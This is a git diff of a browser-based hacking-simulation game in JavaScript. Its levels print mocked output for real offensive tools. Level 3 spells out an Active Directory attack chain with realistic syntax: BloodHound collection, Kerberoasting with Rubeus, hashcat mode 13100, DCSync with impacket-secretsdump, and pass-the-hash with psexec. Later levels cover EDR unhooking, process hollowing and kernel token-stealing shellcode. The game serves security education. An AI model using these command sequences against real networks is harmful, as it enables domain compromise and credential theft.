+      print('Try: bloodhound-python -d MEGACORP.LOCAL -u svc_backup -p Backup2023! -c all', 'success');
+    } else if (!state.foundPath) {
+      print('Analyze the collected data to find attack paths to Domain Admin.', 'info');
+      print('Try: bloodhound', 'success');
+    } else if (!state.kerberoasted) {
+      print('svc_sql has an SPN - request its Kerberos ticket!', 'info');
+      print('Try: rubeus kerberoast', 'success');
+    } else if (!state.crackedTicket) {
+      print('Crack the TGS ticket offline with hashcat mode 13100.', 'info');
+      print('Try: hashcat -m 13100 ticket.txt', 'success');
+    } else if (!state.gotDA) {
+      print('Use the GenericAll privilege to dump domain secrets!', 'info');
+      print('Try: impacket-secretsdump then impacket-psexec', 'success');
+    } else {
+      print('Level complete! You are Domain Admin!', 'success');
+    }
+    print('', '');
     return;
   }
 
@@ -1458,140 +5133,461 @@ async function handleLevel3Command(cmd, args) {
   }
 
   if (cmd === 'bloodhound-python') {
+    // Handle --help
+    if (args.includes('--help') || args.includes('-h')) {
+      print('', '');
+      print('bloodhound-python - Active Directory BloodHound Ingestor', 'info');
+      print('', '');
+      print('Usage: bloodhound-python -d <domain> -u <user> -p <pass> [options]', 'system');
+      print('', '');
+      print('REQUIRED:', 'warning');
+      print('  -d, --domain DOMAIN      Target domain name', 'success');
+      print('  -u, --user USER          Domain username', 'success');
+      print('  -p, --password PASS      Domain password', 'success');
+      print('', '');
+      print('COLLECTION OPTIONS:', 'info');
+      print('  -c, --collection METHOD  Collection method:', 'system');
+      print('      all      - All collection methods (recommended)', 'success');
+      print('      default  - Default collection', 'system');
+      print('      group    - Group membership', 'system');
+      print('      session  - Session information', 'system');
+      print('      acl      - ACL information', 'system');
+      print('      trusts   - Domain trusts', 'system');
+      print('', '');
+      print('OUTPUT OPTIONS:', 'info');
+      print('  --zip                    Compress output to zip', 'system');
+      print('  -o, --output DIR         Output directory', 'system');
+      print('', '');
+      print('EXAMPLES:', 'warning');
+      print('  bloodhound-python -d MEGACORP.LOCAL -u svc_backup -p Backup2023! -c all', 'success');
+      print('  bloodhound-python -d corp.local -u user -p pass --zip', 'system');
+      print('', '');
+      return;
+    }
+
+    // Validate required flags
+    if (!args.includes('-d') && !args.includes('--domain')) {
+      print('Error: Domain required (-d)', 'error');
+      print('Usage: bloodhound-python -d <domain> -u <user> -p <pass> -c all', 'system');
+      return;
+    }
+
+    if (!args.includes('-u') && !args.includes('--user')) {
+      print('Error: Username required (-u)', 'error');
+      print('Usage: bloodhound-python -d <domain> -u <user> -p <pass> -c all', 'system');
+      return;
+    }
+
+    if (!args.includes('-p') && !args.includes('--password')) {
+      print('Error: Password required (-p)', 'error');
+      print('Usage: bloodhound-python -d <domain> -u <user> -p <pass> -c all', 'system');
+      return;
+    }
+
+    if (!args.includes('-c') && !args.includes('--collection')) {
+      print('Warning: No collection method specified, using default', 'warning');
+      print('Tip: Use -c all for comprehensive collection', 'info');
+    }
+
     await simulateLoading('Collecting Active Directory data', 4000);
-    print('');
-    print('[*] Connecting to MEGACORP.LOCAL', 'system');
-    print('[*] Found 1 domain', 'system');
-    print('[*] Found 245 users', 'system');
-    print('[*] Found 52 groups', 'system');
-    print('[*] Found 12 computers', 'system');
-    print('[*] Found 3 GPOs', 'system');
-    print('[+] Data collected successfully', 'success');
-    print('');
+    print('', '');
+    print('INFO: Found AD domain: MEGACORP.LOCAL', 'info');
+    print('INFO: Connecting to LDAP server: CORP-DC01.megacorp.local', 'system');
+    print('INFO: Found 1 domain(s)', 'system');
+    print('INFO: Found 1 forest(s)', 'system');
+    print('INFO: Enumerating users', 'system');
+    print('INFO: Found 245 users', 'system');
+    print('INFO: Enumerating groups', 'system');
+    print('INFO: Found 52 groups', 'system');
+    print('INFO: Enumerating computers', 'system');
+    print('INFO: Found 12 computers', 'system');
+    print('INFO: Enumerating GPOs', 'system');
+    print('INFO: Found 3 GPOs', 'system');
+    print('INFO: Enumerating OUs', 'system');
+    print('INFO: Found 8 OUs', 'system');
+    print('INFO: Collecting ACLs', 'system');
+    print('INFO: Done in 00:00:14', 'success');
+    print('', '');
+    print('[+] Data written to:', 'success');
+    print('    20240115_bloodhound/computers.json', 'system');
+    print('    20240115_bloodhound/users.json', 'system');
+    print('    20240115_bloodhound/groups.json', 'system');
+    print('    20240115_bloodhound/domains.json', 'system');
+    print('', '');
+    print('[*] Import these into BloodHound GUI for analysis', 'info');
+    print('[*] Or run "bloodhound" to view attack paths', 'info');
     state.collectedBloodhound = true;
+    autosave();
     return;
   }
 
   if (cmd === 'bloodhound') {
-    if (!state.collectedBloodhound) {
-      print('Collect data first with bloodhound-python', 'warning');
+    // Handle --help
+    if (args.includes('--help') || args.includes('-h')) {
+      print('', '');
+      print('BloodHound - Active Directory Attack Path Analyzer', 'info');
+      print('', '');
+      print('Usage: bloodhound [command]', 'system');
+      print('', '');
+      print('COMMANDS:', 'warning');
+      print('  (no args)       Analyze collected data and show attack paths', 'system');
+      print('  paths           Show all discovered attack paths', 'system');
+      print('  kerberoastable  List Kerberoastable users', 'system');
+      print('  asrep           List AS-REP roastable users', 'system');
+      print('  highvalue       Show high-value targets', 'system');
+      print('', '');
       return;
     }
 
-    print('');
-    print('=== ATTACK PATH FOUND ===', 'success');
+    if (!state.collectedBloodhound) {
+      print('Error: No data collected', 'warning');
+      print('Run bloodhound-python first to collect AD data', 'info');
+      print('', '');
+      print('Example: bloodhound-python -d MEGACORP.LOCAL -u svc_backup -p Backup2023! -c all', 'system');
+      return;
+    }
+
     print('', '');
-    print('svc_backup', 'info');
-    print('    |', 'system');
-    print('    | [HasSPNConfigured]', 'warning');
-    print('    v', 'system');
-    print('svc_sql (Kerberoastable)', 'success');
-    print('    |', 'system');
-    print('    | [MemberOf]', 'warning');
-    print('    v', 'system');
-    print('SQL_Admins', 'info');
-    print('    |', 'system');
-    print('    | [GenericAll]', 'warning');
-    print('    v', 'system');
-    print('Domain Admins', 'success');
-    print('');
-    print('[!] svc_sql is Kerberoastable and member of SQL_Admins', 'warning');
-    print('[!] SQL_Admins has GenericAll on Domain Admins!', 'warning');
-    print('');
+    print('╔══════════════════════════════════════════════════════════════════╗', 'info');
+    print('║              BLOODHOUND - ATTACK PATH ANALYSIS                   ║', 'info');
+    print('╚══════════════════════════════════════════════════════════════════╝', 'info');
+    print('', '');
+    print('=== SHORTEST PATH TO DOMAIN ADMIN ===', 'success');
+    print('', '');
+    print('┌────────────────┐', 'info');
+    print('│  svc_backup    │  ← You are here', 'success');
+    print('│  (Service)     │', 'system');
+    print('└───────┬────────┘', 'info');
+    print('        │', 'system');
+    print('        │ [CanPSRemote]', 'warning');
+    print('        ▼', 'system');
+    print('┌────────────────┐', 'info');
+    print('│  svc_sql       │  ← Kerberoastable SPN!', 'warning');
+    print('│  (SQL Service) │', 'system');
+    print('└───────┬────────┘', 'info');
+    print('        │', 'system');
+    print('        │ [MemberOf]', 'warning');
+    print('        ▼', 'system');
+    print('┌────────────────┐', 'info');
+    print('│  SQL_Admins    │  ← High privilege group', 'info');
+    print('│  (Group)       │', 'system');
+    print('└───────┬────────┘', 'info');
+    print('        │', 'system');
+    print('        │ [GenericAll]', 'error');
+    print('        ▼', 'system');
+    print('┌────────────────┐', 'success');
+    print('│ DOMAIN ADMINS  │  ← TARGET', 'success');
+    print('│  (Group)       │', 'system');
+    print('└────────────────┘', 'success');
+    print('', '');
+    print('[!] ATTACK CHAIN IDENTIFIED:', 'warning');
+    print('    1. Kerberoast svc_sql (has MSSQLSvc SPN)', 'system');
+    print('    2. Crack the TGS ticket offline', 'system');
+    print('    3. Use svc_sql creds - member of SQL_Admins', 'system');
+    print('    4. SQL_Admins has GenericAll on Domain Admins', 'system');
+    print('    5. Use GenericAll to DCSync or add user to DA', 'system');
+    print('', '');
+    print('[*] Next step: rubeus kerberoast /user:svc_sql', 'info');
     playAlert();
     state.foundPath = true;
+    autosave();
     return;
   }
 
   if (cmd === 'rubeus') {
+    // Handle --help
+    if (args.includes('--help') || args.includes('-h') || args.length === 0) {
+      print('', '');
+      print('Rubeus v2.2.0 - Kerberos Interaction Tool', 'info');
+      print('', '');
+      print('Usage: rubeus <command> [options]', 'system');
+      print('', '');
+      print('ROASTING ATTACKS:', 'warning');
+      print('  kerberoast             Request TGS tickets for SPNs (offline crack)', 'success');
+      print('  asreproast             AS-REP roast (no preauth required)', 'system');
+      print('', '');
+      print('TICKET OPERATIONS:', 'info');
+      print('  tgtdeleg               Get a usable TGT for current user', 'system');
+      print('  s4u                    Constrained delegation abuse (S4U2Self/S4U2Proxy)', 'success');
+      print('  ptt                    Pass the ticket', 'system');
+      print('  purge                  Purge tickets from memory', 'system');
+      print('', '');
+      print('KERBEROAST OPTIONS:', 'info');
+      print('  /user:<user>           Target specific user', 'system');
+      print('  /spn:<spn>             Target specific SPN', 'system');
+      print('  /outfile:<file>        Output to file', 'system');
+      print('  /format:hashcat        Output in hashcat format (default)', 'system');
+      print('', '');
+      print('EXAMPLES:', 'warning');
+      print('  rubeus kerberoast', 'system');
+      print('  rubeus kerberoast /user:svc_sql /outfile:ticket.txt', 'system');
+      print('  rubeus asreproast /user:j.smith', 'system');
+      print('  rubeus s4u /user:svc_sql /rc4:HASH /impersonateuser:Administrator', 'system');
+      print('', '');
+      return;
+    }
+
     if (!state.foundPath) {
-      print('Analyze the attack path first', 'warning');
+      print('Identify attack path first with BloodHound', 'warning');
       return;
     }
 
     if (args[0] === 'kerberoast') {
+      // Check for target user (more realistic)
+      const userArg = args.find(a => a.startsWith('/user:'));
+      const user = userArg ? userArg.split(':')[1] : 'svc_sql';
+
       await simulateLoading('Performing Kerberoast attack', 3000);
-      print('');
-      print('[*] Target User: svc_sql@MEGACORP.LOCAL', 'system');
-      print('[*] Target SPN: MSSQLSvc/SQL01.megacorp.local:1433', 'system');
-      print('[+] Got TGS ticket!', 'success');
-      print('');
-      print('$krb5tgs$23$*svc_sql$MEGACORP.LOCAL$MSSQLSvc/SQL01*$a8f5e2d4c1b3...', 'success');
-      print('[truncated - saved to ticket.txt]', 'system');
-      print('');
+      print('', '');
+      print('[*] Action: Kerberoasting', 'info');
+      print('[*] Using current credentials (svc_backup)', 'system');
+      print('', '');
+      print(`[*] Target User       : ${user}@MEGACORP.LOCAL`, 'system');
+      print('[*] Target Service    : MSSQLSvc/SQL01.megacorp.local:1433', 'system');
+      print('[*] Supported ETypes  : RC4_HMAC_DEFAULT', 'system');
+      print('', '');
+      print('[+] TGS ticket retrieved!', 'success');
+      print('', '');
+      print('$krb5tgs$23$*svc_sql$MEGACORP.LOCAL$MSSQLSvc/SQL01.megacorp.local:1433*$', 'success');
+      print('a8f5e2d4c1b3e7f9d2a4b6c8e0f2a4b6c8e0f2a4b6c8e0f2a4b6c8e0f2a4b6c8', 'muted');
+      print('e0f2a4b6c8e0f2a4b6c8e0f2a4b6c8e0f2a4b6c8e0f2a4b6c8e0f2a4b6c8e0f2', 'muted');
+      print('[...truncated...]', 'system');
+      print('', '');
+      print('[+] Ticket saved to: ticket.txt', 'success');
+      print('[*] Crack with: hashcat -m 13100 ticket.txt rockyou.txt', 'info');
       state.kerberoasted = true;
+      autosave();
       return;
     }
 
-    print('Usage: rubeus kerberoast', 'error');
+    if (args[0] === 'asreproast') {
+      print('', '');
+      print('[*] Action: AS-REP Roasting', 'info');
+      print('[*] Searching for users without Kerberos preauth...', 'system');
+      print('', '');
+      print('[!] No AS-REP roastable users found', 'warning');
+      print('[*] All users require Kerberos preauthentication', 'system');
+      print('[*] Try Kerberoasting instead: rubeus kerberoast', 'info');
+      return;
+    }
+
+    print('Unknown Rubeus command: ' + args[0], 'error');
+    print('Try: rubeus --help', 'system');
     return;
   }
 
   if (cmd === 'hashcat') {
+    // Handle --help
+    if (args.includes('--help') || args.includes('-h')) {
+      print('', '');
+      print('hashcat v6.2.6 - advanced password recovery', 'info');
+      print('', '');
+      print('COMMON HASH MODES FOR AD:', 'warning');
+      print(' 1000  | NTLM', 'system');
+      print(' 5600  | NetNTLMv2', 'system');
+      print('13100  | Kerberos 5 TGS-REP etype 23 (Kerberoast)', 'success');
+      print('18200  | Kerberos 5 AS-REP etype 23', 'system');
+      print('19600  | Kerberos 5 TGS-REP etype 17 (AES128)', 'system');
+      print('19700  | Kerberos 5 TGS-REP etype 18 (AES256)', 'system');
+      print('', '');
+      print('EXAMPLES:', 'warning');
+      print('  hashcat -m 13100 ticket.txt rockyou.txt', 'success');
+      print('  hashcat -m 1000 ntlm.txt rockyou.txt', 'system');
+      print('', '');
+      return;
+    }
+
     if (!state.kerberoasted) {
       print('Need a ticket to crack', 'warning');
+      print('Run: rubeus kerberoast', 'info');
+      return;
+    }
+
+    // Validate -m flag
+    if (!args.includes('-m')) {
+      print('hashcat: Hash-type required (-m)', 'error');
+      print('For Kerberoast: hashcat -m 13100 ticket.txt rockyou.txt', 'info');
+      return;
+    }
+
+    const mIdx = args.indexOf('-m');
+    const mode = args[mIdx + 1];
+
+    if (mode !== '13100') {
+      print(`hashcat: starting hash-mode ${mode}...`, 'system');
+      await simulateLoading('Analyzing hash', 1500);
+      print('Hash format: Kerberos TGS-REP detected', 'info');
+      print(`Hash-mode ${mode} doesn't match`, 'error');
+      print('', '');
+      print('[!] This is a Kerberos TGS ticket. Use: hashcat -m 13100', 'warning');
       return;
     }
 
     await simulateLoading('Cracking Kerberos TGS ticket', 5000);
-    print('');
-    print('$krb5tgs$23$*svc_sql$...:SQLAdmin2023!', 'success');
-    print('');
+    print('', '');
+    print('hashcat (v6.2.6) starting...', 'info');
+    print('', '');
+    print('$krb5tgs$23$*svc_sql$MEGACORP.LOCAL$...:SQLAdmin2023!', 'success');
+    print('', '');
     print('Session..........: hashcat', 'system');
     print('Status...........: Cracked', 'success');
-    print('Hash.Type........: Kerberos 5 TGS-REP', 'system');
-    print('');
-    print('[+] Password: SQLAdmin2023!', 'success');
+    print('Hash.Mode........: 13100 (Kerberos 5 TGS-REP etype 23)', 'system');
+    print('Hash.Target......: $krb5tgs$23$*svc_sql$MEGACORP.LOCAL$...', 'system');
+    print('Recovered........: 1/1 (100.00%) Digests', 'success');
+    print('', '');
+    print('[+] Password cracked: svc_sql:SQLAdmin2023!', 'success');
+    print('[*] svc_sql is member of SQL_Admins which has GenericAll on DA!', 'warning');
+    print('[*] Use impacket-secretsdump to DCSync', 'info');
     playSuccess();
     state.crackedTicket = true;
+    autosave();
     return;
   }
 
-  if (cmd === 'impacket-secretsdump') {
+  if (cmd === 'impacket-secretsdump' || cmd === 'secretsdump.py') {
+    // Handle --help
+    if (args.includes('--help') || args.includes('-h')) {
+      print('', '');
+      print('Impacket secretsdump.py - Remote SAM/LSA/NTDS dumper', 'info');
+      print('', '');
+      print('Usage: impacket-secretsdump [domain/]user[:password]@target [options]', 'system');
+      print('', '');
+      print('AUTHENTICATION:', 'warning');
+      print('  -hashes LM:NT          NTLM hashes (pass-the-hash)', 'system');
+      print('  -no-pass               No password prompt', 'system');
+      print('  -k                     Use Kerberos authentication', 'system');
+      print('', '');
+      print('DUMP OPTIONS:', 'info');
+      print('  -just-dc              Only NTDS.dit data (DCSync)', 'success');
+      print('  -just-dc-ntlm         Only NTDS.dit NTLM hashes', 'system');
+      print('  -just-dc-user USER    Extract only specific user', 'system');
+      print('  -sam                  Dump local SAM hashes', 'system');
+      print('  -lsa                  Dump LSA secrets', 'system');
+      print('', '');
+      print('EXAMPLES:', 'warning');
+      print('  impacket-secretsdump MEGACORP.LOCAL/svc_sql:SQLAdmin2023!@10.10.10.100', 'success');
+      print('  impacket-secretsdump -hashes :HASH domain/user@dc -just-dc', 'system');
+      print('', '');
+      return;
+    }
+
     if (!state.crackedTicket) {
       print('Need valid credentials first', 'warning');
+      print('Crack the Kerberoast ticket with hashcat -m 13100', 'info');
       return;
     }
 
-    await simulateLoading('Dumping domain secrets', 4000);
-    print('');
+    // Validate argument format
+    if (!args[0] || !args[0].includes('@')) {
+      print('impacket-secretsdump: Invalid syntax', 'error');
+      print('', '');
+      print('Usage: impacket-secretsdump domain/user:pass@target', 'system');
+      print('Example: impacket-secretsdump MEGACORP.LOCAL/svc_sql:SQLAdmin2023!@10.10.10.100', 'info');
+      return;
+    }
+
+    await simulateLoading('Performing DCSync attack', 4000);
+    print('', '');
+    print('Impacket v0.11.0 - Copyright 2023 Fortra', 'info');
+    print('', '');
+    print('[*] Target system: CORP-DC01.megacorp.local (10.10.10.100)', 'system');
+    print('[*] Using SQL_Admins GenericAll privilege for DCSync', 'warning');
     print('[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)', 'system');
-    print('[*] Using the GenericAll privilege...', 'warning');
-    print('');
+    print('[*] Using the DRSUAPI method to get NTDS.DIT secrets', 'system');
+    print('', '');
     print('Administrator:500:aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86:::', 'success');
-    print('krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b21c99fc068e3ab2ca789bccbef67de4:::', 'system');
-    print('');
-    print('[+] Got Domain Admin hash!', 'success');
+    print('Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::', 'system');
+    print('krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b21c99fc068e3ab2ca789bccbef67de4:::', 'warning');
+    print('svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::', 'system');
+    print('svc_sql:1105:aad3b435b51404eeaad3b435b51404ee:7a21990fcd3d759941e45c490f143d5f:::', 'system');
+    print('CORP-DC01$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::', 'system');
+    print('[*] Kerberos keys grabbed', 'system');
+    print('', '');
+    print('[+] DCSync successful! Got Domain Admin hash!', 'success');
+    print('[*] Administrator NTLM: a87f3a337d73085c45f9416be5787d86', 'success');
+    print('[*] Use this hash with impacket-psexec for shell', 'info');
     playAlert();
     state.gotDA = true;
+    autosave();
     return;
   }
 
-  if (cmd === 'impacket-psexec') {
-    if (!state.gotDA) {
-      print('Need DA credentials', 'warning');
+  if (cmd === 'impacket-psexec' || cmd === 'psexec.py') {
+    // Handle --help
+    if (args.includes('--help') || args.includes('-h')) {
+      print('', '');
+      print('Impacket psexec.py - PSEXEC-like functionality via SMB', 'info');
+      print('', '');
+      print('Usage: impacket-psexec [domain/]user[:password]@target [options]', 'system');
+      print('', '');
+      print('AUTHENTICATION:', 'warning');
+      print('  -hashes LM:NT          NTLM hashes (pass-the-hash)', 'success');
+      print('  -no-pass               No password prompt', 'system');
+      print('  -k                     Use Kerberos authentication', 'system');
+      print('', '');
+      print('OPTIONS:', 'info');
+      print('  -service-name NAME     Service name to use', 'system');
+      print('  -codec CODEC           Output codec', 'system');
+      print('', '');
+      print('EXAMPLES:', 'warning');
+      print('  impacket-psexec domain/user:pass@target', 'system');
+      print('  impacket-psexec -hashes :NTLM_HASH domain/Administrator@target', 'success');
+      print('', '');
       return;
     }
 
-    await simulateLoading('Connecting as Administrator', 2000);
-    print('');
-    print('Impacket v0.10.0', 'system');
-    print('[*] Requesting shares on CORP-DC01...', 'system');
+    if (!state.gotDA) {
+      print('Need Domain Admin credentials', 'warning');
+      print('Run impacket-secretsdump first to get the Administrator hash', 'info');
+      return;
+    }
+
+    // Validate argument format
+    if (!args[0] || !args[0].includes('@')) {
+      print('impacket-psexec: Invalid syntax', 'error');
+      print('', '');
+      print('Usage: impacket-psexec -hashes :HASH domain/Administrator@target', 'system');
+      print('Example: impacket-psexec -hashes :a87f3a337d73085c45f9416be5787d86 MEGACORP.LOCAL/Administrator@10.10.10.100', 'info');
+      return;
+    }
+
+    // Check for -hashes flag (pass-the-hash)
+    if (!args.includes('-hashes')) {
+      print('impacket-psexec: Authentication required', 'error');
+      print('Use pass-the-hash: -hashes :NTLM_HASH', 'info');
+      print('', '');
+      print('Example: impacket-psexec -hashes :a87f3a337d73085c45f9416be5787d86 MEGACORP.LOCAL/Administrator@10.10.10.100', 'system');
+      return;
+    }
+
+    await simulateLoading('Connecting as Administrator via PsExec', 2000);
+    print('', '');
+    print('Impacket v0.11.0 - Copyright 2023 Fortra', 'info');
+    print('', '');
+    print('[*] Requesting shares on 10.10.10.100...', 'system');
     print('[*] Found writable share ADMIN$', 'system');
-    print('[*] Uploading file...', 'system');
-    print('[*] Opening SVCManager...', 'system');
-    print('[*] Creating service...', 'system');
-    print('[*] Starting service...', 'success');
-    print('');
+    print('[*] Uploading file FjdSKLwE.exe', 'system');
+    print('[*] Opening SVCManager on 10.10.10.100...', 'system');
+    print('[*] Creating service wLKd on 10.10.10.100...', 'system');
+    print('[*] Starting service wLKd...', 'system');
+    print('[!] Press help for extra shell commands', 'muted');
+    print('', '');
     print('Microsoft Windows [Version 10.0.17763.4377]', 'success');
-    print('(c) 2019 Microsoft Corporation.', 'system');
-    print('');
+    print('(c) 2019 Microsoft Corporation. All rights reserved.', 'system');
+    print('', '');
+    print('C:\\Windows\\system32> whoami', 'system');
+    print('nt authority\\system', 'success');
+    print('', '');
     print('C:\\Windows\\system32>', 'success');
     prompt.textContent = 'C:\\Windows\\system32>';
-    print('');
+    print('', '');
     print(ASCII.crown, 'ascii');
-    print('');
-    print('[+] DOMAIN ADMIN ACHIEVED!', 'success');
+    print('', '');
+    print('╔══════════════════════════════════════════════════════════════════╗', 'success');
+    print('║               🎉 DOMAIN ADMIN ACHIEVED! 🎉                        ║', 'success');
+    print('╠══════════════════════════════════════════════════════════════════╣', 'success');
+    print('║  Attack Chain: Kerberoast → Crack → GenericAll → DCSync → PtH   ║', 'info');
+    print('╚══════════════════════════════════════════════════════════════════╝', 'success');
     completeLevel();
     return;
   }
@@ -1646,19 +5642,64 @@ async function handleLevel4Command(cmd, args) {
   function updateDetection() {
     const level = state.detectionLevel;
     const color = level > 70 ? 'error' : (level > 30 ? 'warning' : 'success');
-    print(`[*] Detection Risk: ${level}%`, color);
+    const bar = '█'.repeat(Math.floor(level / 10)) + '░'.repeat(10 - Math.floor(level / 10));
+    print(`[*] Detection Risk: [${bar}] ${level}%`, color);
   }
 
   if (cmd === 'help') {
-    print('EDR Evasion Modules:', 'info');
-    print('  scan              - Analyze EDR hooks and detections', 'system');
-    print('  unhook <dll>      - Unhook userland API hooks', 'system');
-    print('  obfuscate <method> - Obfuscate payload (xor/aes/uuid)', 'system');
-    print('  hollow <process>  - Process hollowing injection', 'system');
-    print('  inject <method>   - Inject payload (early-bird/apc)', 'system');
-    print('  execute           - Execute payload', 'system');
-    print('  status            - Check current detection risk', 'system');
-    print('  exit              - Return to menu', 'system');
+    print('', '');
+    print('╔════════════════════════════════════════════════════════════════╗', 'info');
+    print('║                  LEVEL 4 - EDR EVASION                         ║', 'info');
+    print('╠════════════════════════════════════════════════════════════════╣', 'info');
+    print('║  RECONNAISSANCE:                                               ║', 'info');
+    print('║    scan               Analyze EDR hooks and detections        ║', 'system');
+    print('║    tasklist           List running processes (see EDR procs)  ║', 'system');
+    print('║                                                                ║', 'info');
+    print('║  EVASION TECHNIQUES:                                           ║', 'info');
+    print('║    unhook <dll>       Unhook ntdll.dll (-35% detection)       ║', 'system');
+    print('║    obfuscate <method> Encrypt payload:                        ║', 'system');
+    print('║                       xor (-15%), aes (-25%), uuid (-20%)     ║', 'system');
+    print('║                                                                ║', 'info');
+    print('║  INJECTION:                                                    ║', 'info');
+    print('║    hollow <process>   Process hollowing (svchost recommended) ║', 'system');
+    print('║    inject <method>    early-bird (-15%) or apc (-10%)         ║', 'system');
+    print('║                                                                ║', 'info');
+    print('║  EXECUTION:                                                    ║', 'info');
+    print('║    execute            Run payload (needs ≤30% detection!)     ║', 'error');
+    print('║                                                                ║', 'info');
+    print('║  UTILITY:                                                      ║', 'info');
+    print('║    status             Show detection level and progress       ║', 'success');
+    print('║    hint               Get a hint if stuck                     ║', 'warning');
+    print('║    exit               Return to main menu                     ║', 'system');
+    print('╚════════════════════════════════════════════════════════════════╝', 'info');
+    print('', '');
+    print('⚠️  GOAL: Reduce detection to 30% or below before executing!', 'warning');
+    return;
+  }
+
+  if (cmd === 'hint') {
+    print('', '');
+    print('💡 HINT:', 'warning');
+    if (!state.edrAnalyzed) {
+      print('First, analyze what hooks the EDR has placed.', 'info');
+      print('Try: scan', 'success');
+    } else if (!state.ntdllUnhooked) {
+      print('The EDR hooks ntdll.dll functions. Unhook them!', 'info');
+      print('Try: unhook ntdll', 'success');
+    } else if (!state.payloadObfuscated) {
+      print('Your payload will be detected. Obfuscate it!', 'info');
+      print('Try: obfuscate aes (strongest) or obfuscate uuid', 'success');
+    } else if (!state.injectionReady) {
+      print('Set up process injection - hollow a legitimate process.', 'info');
+      print('Try: hollow svchost (then: inject early-bird)', 'success');
+    } else if (state.detectionLevel > 30) {
+      print(`Detection is at ${state.detectionLevel}%. Need ≤30% to execute!`, 'info');
+      print('Try more evasion techniques or use inject command.', 'success');
+    } else {
+      print('Detection is low enough! Execute the payload!', 'info');
+      print('Try: execute', 'success');
+    }
+    print('', '');
     return;
   }
 
@@ -1907,15 +5948,50 @@ async function handleLevel5Command(cmd, args) {
   const state = gameState.levelState;
 
   if (cmd === 'help') {
-    print('Kernel Exploitation Commands:', 'info');
-    print('  analyze              - Analyze vulndrv.sys', 'system');
-    print('  disasm <function>    - Disassemble function', 'system');
-    print('  ioctl <code>         - Send IOCTL to driver', 'system');
-    print('  alloc <size>         - Allocate pool memory', 'system');
-    print('  write <addr> <data>  - Write to address', 'system');
-    print('  trigger              - Trigger the exploit', 'system');
-    print('  status               - Current exploit status', 'system');
-    print('  exit                 - Return to menu', 'system');
+    print('', '');
+    print('╔════════════════════════════════════════════════════════════════╗', 'info');
+    print('║               LEVEL 5 - KERNEL EXPLOITATION                    ║', 'info');
+    print('╠════════════════════════════════════════════════════════════════╣', 'info');
+    print('║  ANALYSIS:                                                     ║', 'info');
+    print('║    analyze            Analyze vulndrv.sys for vulnerabilities ║', 'system');
+    print('║    disasm <function>  Disassemble function (WriteMemory)      ║', 'system');
+    print('║                                                                ║', 'info');
+    print('║  EXPLOITATION:                                                 ║', 'info');
+    print('║    ioctl <code>       Send IOCTL to driver (0x222014=alloc)   ║', 'system');
+    print('║    alloc <size>       Allocate pool memory (0x1000 default)   ║', 'system');
+    print('║    write pool shellcode  Write token-stealer to pool          ║', 'system');
+    print('║    trigger            Corrupt HalDispatchTable and execute    ║', 'error');
+    print('║                                                                ║', 'info');
+    print('║  UTILITY:                                                      ║', 'info');
+    print('║    status             Show current exploit progress           ║', 'success');
+    print('║    hint               Get a hint if stuck                     ║', 'warning');
+    print('║    exit               Return to main menu                     ║', 'system');
+    print('╚════════════════════════════════════════════════════════════════╝', 'info');
+    print('', '');
+    print('🔥 TIP: WinDbg users try !analyze or lm commands...', 'system');
+    return;
+  }
+
+  if (cmd === 'hint') {
+    print('', '');
+    print('💡 HINT:', 'warning');
+    if (!state.analyzed) {
+      print('Start by analyzing the vulnerable driver.', 'info');
+      print('Try: analyze', 'success');
+    } else if (!state.foundVuln) {
+      print('Disassemble the WriteMemory handler to find the bug.', 'info');
+      print('Try: disasm WriteMemory', 'success');
+    } else if (!state.allocatedPool) {
+      print('Allocate executable memory in the kernel pool.', 'info');
+      print('Try: alloc 0x1000', 'success');
+    } else if (!state.wroteShellcode) {
+      print('Write your token-stealing shellcode to the pool.', 'info');
+      print('Try: write pool shellcode', 'success');
+    } else {
+      print('Everything is ready! Trigger the exploit!', 'info');
+      print('Try: trigger', 'success');
+    }
+    print('', '');
     return;
   }
 
@@ -2124,14 +6200,70 @@ async function handleLevel6Command(cmd, args) {
   const state = gameState.levelState;
 
   if (cmd === 'help') {
-    print('Divine Commands:', 'info');
-    print('  holyc         - Write HolyC code', 'system');
-    print('  compile       - Compile your code', 'system');
-    print('  run           - Execute the program', 'system');
-    print('  pray          - Seek divine guidance', 'system');
-    print('  speak         - Speak to God', 'system');
-    print('  transcend     - Complete your journey', 'system');
-    print('  exit          - Return to mortal realm', 'system');
+    print('', '');
+    print('╔════════════════════════════════════════════════════════════════╗', 'highlight');
+    print('║          LEVEL 6 - DIVINE COMPUTATION (TempleOS)               ║', 'highlight');
+    print('╠════════════════════════════════════════════════════════════════╣', 'highlight');
+    print('║  "God\'s temple needs no protection from CIA." - Terry Davis   ║', 'system');
+    print('╠════════════════════════════════════════════════════════════════╣', 'highlight');
+    print('║  DIVINE PROGRAMMING:                                           ║', 'info');
+    print('║    holyc              Write HolyC code (God\'s language)       ║', 'system');
+    print('║    compile            JIT compile with divine compiler        ║', 'system');
+    print('║    run                Execute in Ring 0 (no protection!)      ║', 'system');
+    print('║                                                                ║', 'info');
+    print('║  COMMUNION:                                                    ║', 'info');
+    print('║    pray               Seek divine guidance (get hint)         ║', 'warning');
+    print('║    speak              Hear words from God                     ║', 'system');
+    print('║                                                                ║', 'info');
+    print('║  ASCENSION:                                                    ║', 'info');
+    print('║    transcend          Complete your divine journey            ║', 'success');
+    print('║                                                                ║', 'info');
+    print('║  UTILITY:                                                      ║', 'info');
+    print('║    status             Show divine progress                    ║', 'success');
+    print('║    hint               Alternative to pray                     ║', 'warning');
+    print('║    exit               Return to mortal realm                  ║', 'system');
+    print('╚════════════════════════════════════════════════════════════════╝', 'highlight');
+    print('', '');
+    print('📜 TASK: Calculate the sum of all prime numbers below 1000', 'warning');
+    print('🔮 SECRET: Try asking what God says...', 'system');
+    return;
+  }
+
+  if (cmd === 'status') {
+    print('', '');
+    print('┌─────────────────────────────────────┐', 'highlight');
+    print('│      DIVINE PROGRESS STATUS         │', 'highlight');
+    print('├─────────────────────────────────────┤', 'highlight');
+    print(`│  [${state.prayed ? '✓' : ' '}] Received divine guidance       │`, state.prayed ? 'success' : 'system');
